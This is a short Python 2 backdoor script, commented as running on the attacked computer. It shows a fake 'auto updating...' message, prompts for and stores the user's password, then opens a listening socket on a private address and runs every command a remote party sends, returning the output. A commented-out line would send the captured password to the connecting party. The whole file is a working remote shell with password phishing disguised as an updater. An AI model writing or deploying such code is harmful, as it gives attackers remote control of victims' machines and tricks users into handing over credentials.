# running on computer being attacked

import os
import socket

print "auto updating..."
print "password:"
psw = raw_input()

address = ('172.16.143.140', 31500)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(address)
s.listen(5)

ss, addr = s.accept()

# ss.send("sudo password: " + psw)

while True:
	command = ss.recv(1024)
	ret = os.popen(command)
	message = str(ret.read())
	ss.send(command + " done...\n" + message)

ss.close()
s.close()
